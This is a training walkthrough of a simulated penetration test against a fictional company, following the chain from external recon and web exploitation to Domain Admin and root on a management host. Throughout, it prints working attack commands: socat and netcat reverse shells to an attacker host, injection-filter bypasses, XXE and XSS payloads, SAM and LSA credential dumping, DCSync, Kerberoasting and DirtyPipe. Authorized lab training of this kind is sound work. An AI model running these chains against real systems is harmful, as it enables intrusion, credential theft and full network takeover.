# Attacking Enterprise Networks: Engagement Walkthrough

A study guide and engagement reference for a simulated penetration test against the fictional company **Inlanefreight**, performed by **Acme Security, Ltd.** The walkthrough covers external recon through Domain Admin and root on a protected management host.

> **Note:** Credentials, hashes, and host details from the original material are redacted here. Keep the methodology, and treat any real engagement with the same care: written authorization, scope checks, and change tracking.

---

## Table of Contents

1. [Engagement Overview](#1-engagement-overview)
2. [Kickoff and Scoping](#2-kickoff-and-scoping)
3. [External Information Gathering](#3-external-information-gathering)
4. [Service Enumeration](#4-service-enumeration)
5. [Web Enumeration and Exploitation](#5-web-enumeration-and-exploitation)
6. [Initial Access and Reverse Shell](#6-initial-access-and-reverse-shell)
7. [Persistence on dmz01](#7-persistence-on-dmz01)
8. [Internal Pivoting](#8-internal-pivoting)
9. [Exploitation and Privesc on DEV01](#9-exploitation-and-privesc-on-dev01)
10. [Lateral Movement and AD Enumeration](#10-lateral-movement-and-ad-enumeration)
11. [Active Directory Compromise](#11-active-directory-compromise)
12. [Double Pivot to the Management Network](#12-double-pivot-to-the-management-network)
13. [Engagement Closeout](#13-engagement-closeout)
14. [Master Attack Chain](#14-master-attack-chain)
15. [Findings](#15-findings)
16. [Credentials Discovered](#16-credentials-discovered)
17. [Tools and Techniques Cheat Sheet](#17-tools-and-techniques-cheat-sheet)
18. [Lessons Learned](#18-lessons-learned)

---

## 1. Engagement Overview

| Field | Value |
|---|---|
| Client | Inlanefreight |
| Tester | Acme Security, Ltd. |
| Assessment type | Full-scope external pentest, then internal |
| Goal | Breach the DMZ, move internally, compromise the AD domain |
| Testing window | 1 week of testing, 2 days of report writing |
| Scan restriction | Heavy scans only after 18:00 London time |
| Evasion | Not required |

### Scope

**External**
- `10.129.x.x` (external-facing host)
- `*.inlanefreight.local` (all subdomains)

**Internal**
- `172.16.8.0/23`
- `172.16.9.0/23` (protected management network)
- `INLANEFREIGHT.LOCAL` (Active Directory)

**Out of scope:** phishing and social engineering, physical attacks, DoS or destructive actions, and environment changes without written consent.

### Deliverables
- Signed SoW and RoE before testing
- Activity log of every action
- Report with prioritized findings
- Post-engagement cleanup
- Report review meeting

---

## 2. Kickoff and Scoping

- The **SoW** (Scope of Work) and **RoE** (Rules of Engagement) must be signed before testing begins.
- The RoE lists URLs, IPs, CIDRs, credentials, contacts (at least two per side), start and stop dates, and the testing window.
- Send a start-of-testing email to all stakeholders.

**First actions:** set up the testing VM, create the notetaking structure, run initial discovery scans, fill in the report template while scans run, send the start email, and begin external information gathering.

---

## 3. External Information Gathering

### Port scanning

```bash
# Quick top-1000 TCP scan
sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope

# Full aggressive scan (OS, version, scripts)
sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope
```

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | vsftpd 3.0.3, anonymous login allowed |
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 25 | SMTP | Postfix |
| 53 | DNS | BIND |
| 80 | HTTP | Apache 2.4.41, "Inlanefreight" |
| 110, 143, 993, 995 | POP3/IMAP | Dovecot |
| 111 | rpcbind | Portmapper exposed |
| 8080 | HTTP | Apache 2.4.41, "Support Center", possibly an open proxy |

OS: Ubuntu Linux.

### DNS zone transfer

Try this first whenever DNS is exposed.

```bash
dig axfr inlanefreight.local @10.129.203.101
```

The transfer succeeded and revealed nine subdomains: `blog`, `careers`, `dev`, `gitlab`, `ir`, `status`, `support`, `tracking`, and `vpn`.

### Vhost fuzzing

Find the baseline response size for an invalid Host header, then filter it out:

```bash
curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
# Baseline: 15157 bytes

ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ \
  -H 'Host:FUZZ.inlanefreight.local' -fs 15157
```

This found the zone-transfer subdomains plus one more, `monitoring.inlanefreight.local`, which did not appear in DNS.

### Hosts file

```bash
sudo tee -a /etc/hosts > /dev/null <<EOT
10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
EOT
```

---

## 4. Service Enumeration

| Service | Result |
|---|---|
| FTP (21) | Anonymous login worked and exposed `flag.txt`, but uploads were denied. Dead end for access. Finding: anonymous FTP enabled. |
| SSH (22) | No usernames available and default credentials failed. Dead end. |
| SMTP (25) | `VRFY` returned valid users (`root`, `www-data`) and rejected unknown ones, enabling user enumeration. No open relay (`smtp-open-relay` failed). Finding: `VRFY` enabled. |
| POP3 (110/995) | Plaintext auth refused on non-TLS connections. Nothing useful. |
| rpcbind (111) | Portmapper exposed externally. No useful data. Finding: unnecessary exposed service. |
| DNS (53) | Zone transfer already covered. |

**Conclusion:** No direct external RCE. Only low-risk findings. Move to the web applications.

### Reporting mindset

- **WASA** (web application security assessment) reports every minor issue.
- **External pentest** focuses on high-risk classes: RCE, SQLi, XSS, XXE, LFI, file upload, and command injection.

---

## 5. Web Enumeration and Exploitation

Screenshot every web app first to triage:

```bash
eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
```

### blog.inlanefreight.local
- Drupal 9 forgotten test site. Drupalgeddon 1 to 3 do not apply to v9.
- Weak admin credentials failed. Registration failed.
- Finding: unused application expands attack surface.

### careers.inlanefreight.local
- Job portal with registration and CV upload.
- The upload accepts any type, but the upload directory was not found.
- The `id` parameter on `/profile?id=` returned other users' data.
- Finding: IDOR leading to sensitive data exposure.

### dev.inlanefreight.local (foothold)
- A "Key Vault" login page. Gobuster found `/uploads` (directory listing) and `/upload.php`.
- `/upload.php` returned 403 inside an otherwise 200 response.
- **HTTP verb tampering:** Burp's OPTIONS response listed `TRACK`. Sending `TRACK` with `X-Custom-IP-Authorization: 127.0.0.1` bypassed the access control and revealed a Pixel Shop upload form.
- **Unrestricted upload:** Changing the `Content-Type` to `image/png` let a PHP web shell through.

```bash
curl http://dev.inlanefreight.local/uploads/<random>.php?cmd=id
# uid=33(www-data)
```

Findings: HTTP verb tampering, unrestricted file upload, directory listing.

### ir.inlanefreight.local (foothold)
- WordPress 6.0 with two vulnerable plugins: `b2i-investor-tools` and `mail-masta`.

```bash
wpscan -e ap -t 500 --url http://ir.inlanefreight.local
wpscan -e u -t 500 --url http://ir.inlanefreight.local
```

- The `mail-masta` plugin has a known LFI:

```bash
curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

- Enumerated users: `ilfreightwp`, `tom`, `james`, `john`.
- Password spraying with a small wordlist found a weak admin password for `ilfreightwp`.
- In `/wp-admin`, editing `404.php` in an inactive theme gave PHP code execution.

Findings: LFI, weak WordPress admin credentials, RCE through the theme editor.

### status.inlanefreight.local (SQLi)
- A log-search app. A single quote caused a MySQL error.
- `sqlmap` confirmed injection (UNION, boolean, time, and error-based).
- The database contained `company` and `users` tables.
- Finding: SQL injection.

### support.inlanefreight.local (stored XSS to admin hijack)
- An IT ticketing portal. The message field on `/ticket.php` was vulnerable to blind XSS.
- A hosted PHP cookie stealer captured the admin session cookie.
- The cookie was loaded with Cookie-Editor to log in as admin.
- Finding: stored XSS leading to session hijack (high).

### tracking.inlanefreight.local (SSRF to local file read)
- The tracking search generates a PDF. Injected JavaScript fetched a local file during PDF generation:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

- Finding: SSRF to local file read (high).

### vpn.inlanefreight.local
- Fortinet SSL VPN. Not vulnerable. Weak credentials failed.
- A candidate for password spraying in a real engagement, but not exploited here.

### gitlab.inlanefreight.local (misconfiguration)
- Open self-registration. Browsing `/explore` revealed a project pointing to `shopdev2.inlanefreight.local`, a vhost that DNS and fuzzing had missed.
- Finding: misconfigured GitLab instance (high).

### shopdev2.inlanefreight.local (XXE)
- Default admin credentials worked. The checkout flow posts XML containing `<subtotal>` and `<userid>`.
- An external entity in the `userid` field returned `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
  <subtotal>undefined</subtotal>
  <userid>&xxetest;</userid>
</root>
```

- Finding: XML external entity injection (high).

### monitoring.inlanefreight.local (foothold and pivot)
- Brute force on the login form with `hydra` found valid admin credentials:

```bash
hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form \
  "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

- The console's `connection_test` function passes input to `/ping.php?ip=`. A blacklist blocked `;`, `|`, spaces, `id`, `wget`, `nc`, and others.
- Bypasses: `%0a` (newline) for command separation, `'i'd` to evade the word filter, and `${IFS}` in place of spaces.

```bash
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
# uid=1004(webdev) gid=1004(webdev) groups=4(adm)
```

- `ifconfig` showed a second NIC on `172.16.8.120`, the internal network. This host became the pivot.
- Finding: command injection (high) and an internal foothold.

---

## 6. Initial Access and Reverse Shell

Obfuscated `socat` reverse shell, sent through the injection point:

```text
127.0.0.1%0a's'o'c'a't'${IFS}TCP4:<ATTACKER_IP>:8443${IFS}EXEC:bash
```

```bash
nc -nvlp 8443
```

Upgrade to a fully interactive TTY:

```bash
# Attack host
socat file:`tty`,raw,echo=0 tcp-listen:4443

# Target, through the nc shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:4443
```

**Privileged group:** `id` showed membership in `adm`, which can read `/var/log`.

```bash
aureport --tty | less
```

The audit log captured a user typing their password into `su` while auditd was recording. That password gave access to the `srvadm` account. Finding: sensitive data in logs.

```bash
su srvadm
/bin/bash -i
```

---

## 7. Persistence on dmz01

Goal: stable access without re-exploiting the web app.

```bash
ssh srvadm@10.129.203.111
```

The host is dual-homed: external on `ens160` and internal on `ens192` (`172.16.8.120`). Docker bridges are also present.

**Sudo rights:**

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/openssl
```

`openssl` is a GTFOBin, so it can read any file as root:

```bash
sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa
```

Copying root's private key gave persistent root access:

```bash
chmod 600 dmz01_key
ssh -i dmz01_key root@10.129.203.111
```

Result: stable access as `srvadm`, root access via the stolen key, and a dual-homed pivot host.

---

## 8. Internal Pivoting

### Option A: SSH dynamic forward and ProxyChains

```bash
ssh -D 8081 -i dmz01_key root@10.129.203.111
```

```text
# /etc/proxychains.conf
socks4 127.0.0.1 8081
```

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

### Option B: Meterpreter

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f elf > shell.elf
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```

After executing it and catching the session:

```text
use post/multi/manage/autoroute
set SESSION 1
set subnet 172.16.8.0
run
```

### Host discovery on 172.16.8.0/23

```text
use post/multi/gather/ping_sweep
set rhosts 172.16.8.0/23
set SESSION 1
run
```

Or a one-liner from dmz01:

```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

Live hosts found: `172.16.8.3` (DC01, domain controller), `172.16.8.20` (DEV01), and `172.16.8.50` (MS01).

Nmap through ProxyChains is slow. Upload a static Nmap binary to dmz01 and scan from there:

```bash
./nmap --open -iL live_hosts
```

| Host | Open ports | Role |
|---|---|---|
| 172.16.8.3 | 53, 88, 135, 139, 389, 445, 464, 593, 636 | Domain controller (Kerberos, LDAP) |
| 172.16.8.20 | 80, 111, 135, 139, 445, 2049, 3389 | DNN (DotNetNuke) and NFS |
| 172.16.8.50 | 135, 139, 445, 3389, 8080 | Tomcat on 8080 |

### Follow-up enumeration

- **DC01:** SMB null session leaked the domain SID but no users, password policy, or useful data. Dead end for direct attack.
- **MS01:** Tomcat manager login brute force failed. Dead end.
- **DEV01:** Registration in DNN was blocked, but the NFS export `/DEV01` was open to everyone.

```bash
proxychains showmount -e 172.16.8.20
# /DEV01 (everyone)

mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cat /tmp/DEV01/DNN/web.config
```

`web.config` contained a cleartext administrator password. This was the breakthrough credential.

Findings: insecure file shares (world-readable NFS), sensitive data on file shares.

---

## 9. Exploitation and Privesc on DEV01

Logging in to DNN with the recovered administrator credentials gave SuperUser access.

### Option A: `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
xp_cmdshell 'whoami'
-- nt service\mssql$sqlexpress
```

### Option B: ASP web shell

- In DNN security settings, allow `.asp` and `.aspx` extensions.
- Upload an ASP web shell through `/admin/file-management` and execute it.

### Privesc to SYSTEM with PrintSpoofer

The service account holds `SeImpersonatePrivilege`, which PrintSpoofer abuses.

1. Allow `.exe` in DNN's allowed extensions.
2. Upload `PrintSpoofer64.exe` and `nc.exe` to `c:\DotNetNuke\Portals\0`.
3. Start a listener on dmz01: `nc -lnvp 443`
4. Trigger:

```cmd
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe <DMZ_INTERNAL_IP> 443 -e cmd"
```

Result: `nt authority\system`.

### Credential dump

```cmd
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```

Allow `.SAVE` in DNN, download the three files through the file manager, and parse them offline:

```bash
secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
```

Output included the local Administrator NTLM hash, a cached domain logon for `hporter`, and an LSA `DefaultPassword` for the same account.

Confirm the local admin hash:

```bash
proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <NTLM_HASH>
# [Pwn3d!]
```

Confirm the domain user:

```cmd
net user hporter /dom
```

Result: first domain credentials, `hporter`.

### Alternate: reverse port forward

If the payload must call back through dmz01 instead of the attacker host:

```bash
# Requires GatewayPorts yes in /etc/ssh/sshd_config on dmz01
ssh -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN
```

Revert the `GatewayPorts` change after testing.

---

## 10. Lateral Movement and AD Enumeration

### BloodHound

```cmd
SharpHound.exe -c All
```

Download the ZIP through DNN's file manager and load it into BloodHound.

Findings:
- `hporter` has `ForceChangePassword` over `ssmalls`.
- All domain users can RDP to DEV01, an excessive privilege (medium).

### RDP pivot

```bash
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:<PASSWORD> /drive:home,"/home/tester/tools"
```

### Resetting ssmalls's password (PowerView)

Resetting a password is invasive. Get client approval first, log the change, and revert it afterward.

```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force) -Verbose
```

```bash
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p '<NEW_PASSWORD>'
```

### Share hunting

Snaffler as `hporter` found nothing useful:

```cmd
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

CrackMapExec `spider_plus` as `ssmalls` found a backup script on the Department Shares:

```bash
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p '<PASSWORD>' -M spider_plus --share 'Department Shares'
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
get "SQL Express Backup.ps1"
```

The script contained a service account's plaintext password (redacted here).

SYSVOL also contained an old `adum.vbs` with a retired password. No matching account existed, but the value was kept as a password-spray candidate.

### Kerberoasting

```powershell
Get-DomainUser * -SPN | Select samaccountname
Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

```bash
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```

One hash cracked, but its account had no useful privileges. Finding: weak Kerberos authentication configuration.

### Password spraying

```powershell
Invoke-DomainPasswordSpray -Password Welcome1
```

Two accounts used the sprayed password. Neither had useful privileges. Finding: weak AD passwords allowed.

### Other checks

- **GPP autologin** (`crackmapexec -M gpp_autologin`): nothing found.
- **AD description field:** one account had a plaintext password in its description. Finding: passwords in AD user description fields.

### Lateral move to MS01 with WinRM

```bash
proxychains nmap -sT -p 5985 172.16.8.50
proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

Note: the Kerberos double-hop limitation affects further AD enumeration over WinRM. Use a PSCredential object for those steps.

### Privesc on MS01

- `C:\panther\unattend.xml` contained a local account's password. The account was in Remote Desktop Users only.
- `C:\Program Files (x86)\SysaxAutomation` ran a scheduled service as SYSTEM.
- Abuse: create a batch file that adds the local account to Administrators, configure a triggered task in the Sysax scheduler to run it when a file lands in the account's Documents folder, then create that file.

```cmd
net localgroup administrators <LOCAL_USER> /add
```

Result: the local account became a local administrator.

### Post-exploitation on MS01

- Interesting files in `C:\` included a budget spreadsheet and a KeePass database. Do not open or copy client data beyond what the scope requires.
- Mimikatz recovered an LSA secret, a `DefaultPassword` for a SQL admin account:

```cmd
mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
```

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

- `Inveigh` captured an NTLMv2 hash from DEV01 over LLMNR, NBNS, and WPAD poisoning:

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

---

## 11. Active Directory Compromise

### Attack chain

```text
SQL admin account -> GenericWrite on target user -> fake SPN + targeted Kerberoast -> crack
target user -> GenericAll on Server Admins -> add self -> DCSync -> Domain Admin
```

### Step 1: Identify the path

BloodHound showed the SQL admin account had `GenericWrite` over `ttimmons`.

### Step 2: Targeted Kerberoast

Set a fake SPN on the target account, then request its ticket:

```powershell
$SecPassword = ConvertTo-SecureString '<SQL_ADMIN_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\<SQL_ADMIN>', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='<FAKE_SPN>'} -Verbose
```

Remove the fake SPN after testing and record it in the report appendix.

```bash
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/<SQL_ADMIN> -request-user ttimmons
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

### Step 3: Group abuse

BloodHound showed `ttimmons` had `GenericAll` on the Server Admins group, which holds `GetChanges` and `GetChangesAll` on the domain (the DCSync rights).

```powershell
$timpass = ConvertTo-SecureString '<TTIMMONS_PASSWORD>' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

### Step 4: DCSync

```bash
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

This returned every domain NTLM hash, including Administrator and krbtgt. **Domain Admin equivalent: main objective achieved.**

### After Domain Admin

- Dump the full NTDS database and crack it offline for password metrics.
- Take a screenshot on the DC (hostname, `whoami`, `ipconfig /all`) as visual proof.
- Test whether the client's alerting catches a temporary privileged account.
- Revert every change made during the engagement.

---

## 12. Double Pivot to the Management Network

### Sensitive data review as DA

- Revisit the department shares. Take screenshots of directory listings only, and do not open or copy client data.
- Found SSH keys under `IT\Private\Networking`.

### Discovering the protected network

DC01 has two NICs: `172.16.8.3` (main domain) and `172.16.9.3` (management network). A ping sweep from DC01 found one live host on the management network:

```powershell
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```

### Chain

```text
Attack host -> dmz01 -> DC01 -> MGMT01
```

1. Meterpreter on dmz01 (ELF payload via SCP).
2. Reverse port forward from dmz01 so DC01 can call back:

```text
portfwd add -R -l 8443 -p 1234 -L <ATTACKER_IP>
```

3. Build a Windows payload that calls back to dmz01's internal address:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o dc_shell.exe
```

4. Upload it to DC01 through WinRM and execute it.
5. Catch the session with a second `multi/handler` on port 8443. This gives Meterpreter as `INLANEFREIGHT\Administrator`.
6. Route and proxy into the management network:

```text
run autoroute -s 172.16.9.0/23

use auxiliary/server/socks_proxy
set srvport 9050
set version 4a
run
```

Update `/etc/proxychains.conf` to `socks4 127.0.0.1 9050`.

```bash
proxychains nmap -sT -p 22 172.16.9.25
```

### SSH into MGMT01

Download the SSH key from the share through WinRM, then:

```bash
chmod 600 ssmallsadm-id_rsa
proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```

### Root on MGMT01 with DirtyPipe (CVE-2022-0847)

```bash
uname -a
# Linux 5.10.0-051000-generic: vulnerable kernel range

find / -perm -4000 2>/dev/null
# /usr/lib/openssh/ssh-keysign is a SUID binary

gcc dirtypipe.c -o dirtypipe
chmod +x dirtypipe
./dirtypipe /usr/lib/openssh/ssh-keysign
```

Result: root on MGMT01. **The client's main goal is achieved.**

---

## 13. Engagement Closeout

### Client notification
- Email confirming testing has ended.
- Give a precise report delivery date.
- Do not blindside the client on high-risk findings.
- Offer a report review meeting slot.

### Attack path recap
- Document the shortest working path only, with no dead ends.
- Keep it ready for when the client asks "how did you get X?"

### Findings documentation
- Log every finding with command output and screenshots as you test.
- Prioritize from highest to lowest risk.
- Finish the documentation before losing access.

### Cleanup
- Delete all uploaded files: tools, shells, and payloads.
- Restore the environment to its original state.
- Log every change in the report appendix, even ones you reverted.
- Keep logs and the activity log so the client can correlate alerts.

### Report-phase client communication
- Confirm testing ended so alerts make sense.
- Give the delivery date and a brief findings recap.
- Attend the review meeting and align retest timelines if the SoW includes them.

### Internal closeout
- Archive the report and project data.
- Hold a lessons-learned debrief.
- Complete any post-engagement sales questionnaire, invoicing, and knowledge transfer.

---

## 14. Master Attack Chain

```text
[External recon]           Nmap, zone transfer, vhost fuzzing
      |
[Web foothold]             dev host: TRACK verb tampering -> unrestricted upload -> PHP shell
      |
[Internal foothold]        monitoring host: brute force -> command injection -> socat shell as webdev
      |
[Privesc to srvadm]        aureport --tty leaked a password from audit logs
      |
[Persistence on dmz01]     sudo openssl (GTFOBin) -> stolen root SSH key
      |
[Internal pivot]           ssh -D + proxychains, or Meterpreter autoroute
      |
[DEV01]                    NFS export -> web.config admin password -> DNN RCE
      |
[SYSTEM on DEV01]          PrintSpoofer (SeImpersonate) -> secretsdump -> domain user hporter
      |
[AD enumeration]           BloodHound -> ForceChangePassword -> ssmalls
      |
[Share hunting]            backup script on share -> backupadm credentials
      |
[MS01]                     WinRM -> unattend.xml -> Sysax scheduled task privesc -> local admin
      |
[Mimikatz on MS01]         LSA secret -> SQL admin account
      |
[Domain Admin]             GenericWrite -> targeted Kerberoast -> group abuse -> DCSync
      |
[Management network]       DC01 double pivot -> MGMT01 SSH keys
      |
[Root on MGMT01]           DirtyPipe (CVE-2022-0847)
      |
[Client's crown jewels compromised]
```

---

## 15. Findings

### High
- HTTP verb tampering (dev host)
- Unrestricted file upload (dev host)
- RCE via PHP web shell (dev host)
- Local file inclusion via vulnerable WordPress plugin (ir host)
- Weak WordPress admin credentials (ir host)
- RCE via WordPress theme editor (ir host)
- SQL injection (status host)
- Stored XSS leading to admin session hijack (support host)
- SSRF leading to local file read (tracking host)
- Misconfigured GitLab instance with open registration (gitlab host)
- XML external entity injection (shopdev2 host)
- Command injection (monitoring host)
- Insecure file shares (world-readable NFS on DEV01)
- Sensitive data on file shares (cleartext admin password in `web.config`)
- Privilege escalation to SYSTEM via SeImpersonate (DEV01)
- Local admin on MS01 via scheduled-task privilege escalation
- Domain compromise via DCSync
- Root on MGMT01 via DirtyPipe

### Medium
- IDOR on careers host
- Excessive AD group privileges (all domain users can RDP to DEV01)
- Passwords in AD user description fields
- Weak Kerberos authentication configuration (Kerberoasting)
- Weak AD passwords allowed (password spraying)

### Low
- Anonymous FTP enabled
- SMTP `VRFY` enabled
- rpcbind exposed externally
- Directory listing enabled (dev host)
- Outdated WordPress plugins with known issues
- Exposed admin panels

---

## 16. Credentials Discovered

All values are redacted. Record the source and the reuse path, not the plaintext, in your own notes.

| Account | Credential type | Source |
|---|---|---|
| ftp | Anonymous | FTP service |
| webdev | Shell via command injection | Monitoring host |
| srvadm | Password | Audit logs (`aureport --tty`) |
| root (dmz01) | SSH private key | Stolen via `sudo openssl` |
| DNN Administrator | Password | NFS `web.config` |
| hporter | Password | LSA DefaultPassword on DEV01 |
| ssmalls | Password (reset via PowerView) | `ForceChangePassword` from hporter |
| backupadm | Password | Backup script on share |
| (retired account) | Old password | SYSVOL script |
| kdenunez, mmertle | Common password | Password spray |
| frontdesk | Password | AD description field |
| ilfserveradm | Password | `unattend.xml` on MS01 |
| mssqladm | Password | Mimikatz LSA secret on MS01 |
| ttimmons | Password (cracked) | Targeted Kerberoast |
| mpalledorous | NTLMv2 hash | Inveigh capture |
| Local Administrator (DEV01) | NTLM hash | `secretsdump` on SAM |
| Domain Administrator | NTLM hash | DCSync |
| krbtgt | NTLM hash | DCSync |
| ssmallsadm | SSH private key | IT share, `Networking` folder |

---

## 17. Tools and Techniques Cheat Sheet

### Reconnaissance

| Tool | Purpose |
|---|---|
| nmap | Port scanning, service versions, scripts |
| dig axfr | DNS zone transfer |
| ffuf / gobuster | Vhost and directory fuzzing |
| EyeWitness | Screenshot web apps for triage |
| curl | Manual HTTP testing |
| wpscan | WordPress fingerprinting and enumeration |

### Exploitation

| Technique | Notes |
|---|---|
| HTTP verb tampering | Allowed methods such as TRACK plus a bypass header |
| Unrestricted upload | Change `Content-Type` to bypass the check |
| LFI | Vulnerable plugin parameter |
| SQLi | sqlmap |
| Blind XSS | Cookie-stealing payload |
| SSRF to file read | XHR to `file://` inside PDF generation |
| XXE | External entity in XML body |
| Command injection | `%0a`, quote splitting, `${IFS}` |
| Reverse shell | socat, nc |

### Post-exploitation and privesc

| Technique | Tool |
|---|---|
| Audit log review | `aureport --tty` |
| GTFOBin | `sudo openssl enc -in <file>` |
| SeImpersonate | PrintSpoofer |
| SAM and LSA dump | `reg save` plus `secretsdump.py` |
| Credential harvesting | Mimikatz, LaZagne, Inveigh |
| Windows privesc | Sysax scheduled service abuse |
| Linux privesc | DirtyPipe (CVE-2022-0847) |

### Pivoting

| Technique | Command |
|---|---|
| SSH dynamic forward | `ssh -D <port> -i key root@host` |
| SSH local forward | `ssh -L <lport>:<internal>:3389 root@host` |
| SSH remote forward | `ssh -R <internal>:<port>:0.0.0.0:<port> root@host` |
| Meterpreter routing | `run autoroute -s <subnet>` |
| SOCKS proxy (MSF) | `auxiliary/server/socks_proxy` |
| ProxyChains | `/etc/proxychains.conf` |

### Active Directory

| Technique | Tool |
|---|---|
| Enumeration | BloodHound, SharpHound |
| Password reset | `Set-DomainUserPassword` (PowerView) |
| Targeted Kerberoast | `Set-DomainObject` plus `GetUserSPNs.py` |
| Group membership | `Add-DomainGroupMember` |
| DCSync | `secretsdump.py -just-dc-ntlm` |
| Kerberoasting | `GetUserSPNs.py` plus `hashcat -m 13100` |
| Password spraying | `Invoke-DomainPasswordSpray` |
| Share hunting | Snaffler, CrackMapExec `spider_plus`, smbclient |

### Windows remote access

| Method | Tool |
|---|---|
| WinRM | evil-winrm |
| Pass-the-hash | `crackmapexec --local-auth -H <hash>` |
| RDP | xfreerdp |
| SMB | smbclient |

---

## 18. Lessons Learned

### Methodology
- Document as you go: findings, commands, outputs, and screenshots.
- Track every change that needs reverting, such as fake SPNs, password resets, and group additions.
- Keep the client informed throughout. Never blindside them.
- Keep the attack path clean and focused.
- Post-DA work matters: password metrics, AD audit, and alert testing.

### Technical
- External web applications are usually the way in, not FTP or SSH.
- Blacklist filters are bypassable with quote splitting, `${IFS}`, and `%0a`.
- Logs and config files often leak credentials: audit logs, `web.config`, and PowerShell scripts.
- Check NFS exports on every internal host.
- A sudo entry for a GTFOBin is an instant privesc path.
- BloodHound shows the path: `ForceChangePassword`, `GenericWrite`, and `GenericAll` are all abusable.
- Kerberoasting is often enough, even for low-privilege accounts with SPNs.
- Password resets are powerful but invasive. Always get client approval.
- Double pivots are normal. Think in layers: attack host, DMZ, DC, management.
- Check `ipconfig /all` on every host. Dual-NIC hosts are pivot gateways.

### Mindset
- Treat labs like real engagements: clean up, document, and minimize impact.
- Time-box dead ends.
- Research unfamiliar tech and look for parallels to what you already know.

### Next practice
- Redo the lab without guidance.
- Swap tools at each step (gobuster vs. ffuf, for example).
- Revisit weak topics.
- Move on to Starting Point, Tracks, and Pro Labs.
- Practice writing reports and briefing others.

---

## Disclaimer

This walkthrough documents a simulated lab environment. Use these techniques only against systems you have explicit written permission to test.
